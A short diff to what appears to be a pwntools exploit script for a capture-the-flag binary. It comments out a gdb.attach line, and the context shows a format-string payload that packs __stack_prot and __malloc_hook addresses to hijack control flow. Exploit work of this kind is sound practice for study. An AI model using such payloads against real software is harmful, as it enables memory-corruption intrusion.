@@ -25,7 +25,7 @@ def aes_enc_unbf(DEBUG):
 	
 	log.info('X: %#x' % (main>>16))
 	log.info('Y: %#x' % ((main&0xffff)-(main>>16)))
-	gdb.attach(r,open("a"))
+	# gdb.attach(r,open("a"))
 	fmt = ""
 	fmt += p32(__stack_prot)
 	fmt += p32(__malloc_hook+2)
